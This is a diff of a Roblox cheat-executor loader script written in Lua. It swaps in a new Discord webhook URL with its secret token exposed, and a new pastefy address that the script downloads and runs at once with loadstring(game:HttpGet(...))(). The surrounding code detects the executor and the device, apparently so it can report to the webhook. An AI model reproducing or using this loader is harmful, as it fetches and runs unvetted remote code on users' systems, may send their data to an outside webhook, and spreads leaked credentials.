@@ -9,7 +9,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local player = Players.LocalPlayer
 
 -- CONFIG
-local webhookUrl = "https://discord.com/api/webhooks/1407895931008847923/wyOcb64GuOOG3TvLTydnivsIk1N__nkx-TukPfPMW2zb3n6ulnMI7G6ydT815lumBQ_N"
+local webhookUrl = "https://discord.com/api/webhooks/1411166387803525180/BUMQHCOfUh1X-dU6pkg4LsgE4nwc-XrS1Rp8Z59Vp46Bj9Z1SFaqVcbaW8rdnauMO_bF"
 local executor = identifyexecutor and identifyexecutor() or "Unknown"
 
 -- Device detection
@@ -239,7 +239,7 @@ local function loadScript()
 
 	task.delay(2, function()
 		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://pastefy.app/5wmUwWFQ/raw"))()
+			loadstring(game:HttpGet("https://pastefy.app/9lPAOk2Y/raw"))()
 		end)
 		if not success and warningLabel then
 			warningLabel.Text = "Failed to load script."
